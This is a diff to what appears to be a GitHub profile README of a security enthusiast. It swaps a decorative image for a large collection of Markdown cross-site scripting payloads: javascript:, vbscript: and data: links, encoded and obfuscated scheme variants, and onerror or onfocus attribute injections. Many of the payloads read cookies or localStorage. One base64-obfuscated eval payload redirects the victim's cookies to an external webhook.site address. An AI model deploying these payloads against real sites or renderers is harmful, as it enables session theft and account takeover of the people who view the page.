@@ -35,11 +35,47 @@
 - 🔧 安全开发
 - 🔰 红蓝对抗
 - 🍟 吃饭睡觉
-
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="./assets/github-snake-dark.svg" />
-  <source media="(prefers-color-scheme: light)" srcset="./assets/github-snake.svg" />
-  <img width="100%" alt="github-snake" src="./assets/github-snake.svg" />
-</picture>
+[Basic](javascript:alert('Basic'))
+[Local Storage](javascript:alert(JSON.stringify(localStorage)))
+[CaseInsensitive](JaVaScRiPt:alert('CaseInsensitive'))
+[URL](javascript://www.google.com%0Aalert('URL'))
+[In Quotes]('javascript:alert("InQuotes")')
+[XSS](javascript:prompt(document.cookie))
+[XSS](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
+[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+[XSS](&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29)
+[XSS]: (javascript:prompt(document.cookie))
+[XSS](javascript:window.onerror=alert;throw%20document.cookie)
+[XSS](javascript://%0d%0aprompt(1))
+[XSS](javascript://%0d%0aprompt(1);com)
+[XSS](javascript:window.onerror=alert;throw%20document.cookie)
+[XSS](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)
+[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+[XSS](vbscript:alert(document.domain))
+[XSS](javascript:this;alert(1))
+[XSS](javascript:this;alert(1&#41;)
+[XSS](javascript&#58this;alert(1&#41;)
+[XSS](Javas&#99;ript:alert(1&#41;)
+[XSS](Javas%26%2399;ript:alert(1&#41;)
+[XSS](javascript:alert&#65534;(1&#41;)
+[XSS](javascript:confirm(1)
+[XSS](javascript://www.google.com%0Aprompt(1))
+[XSS](javascript://%0d%0aconfirm(1);com)
+[XSS](javascript:window.onerror=confirm;throw%201)
+[XSS](�javascript:alert(document.domain&#41;)
+![XSS](javascript:prompt(document.cookie))\
+![XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
+![XSS'"`onerror=prompt(document.cookie)](x)\
+<div id="1
+![](contenteditable/autofocus/onfocus=confirm('qwq')//)">
+-----------------------------------------------
+<a title="a
+<img src=x onerror=alert(1)>">yep</a>
+------------------------------------------------
+[x](y '<style>')<!--</style><div id="x--><img src=1 onerror=alert(1)>"></div>
+----------------------------------------------
+[<p x='<style onload=eval(atob(/bG9jYXRpb249YGh0dHBzOi8vd2ViaG9vay5zaXRlL2FiM2IyYjg5LTg1YTktNGU0YS1hNjg0LTUxN2M1ZjQwNmZmMj9mPWArZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmNvb2tpZSk/.source))>](#'></p>)
+----------------------------------------------
+`<p x="`<img src=x onerror=alert(1)>"></p>
 
 ***不忘初心🔰网为民安***
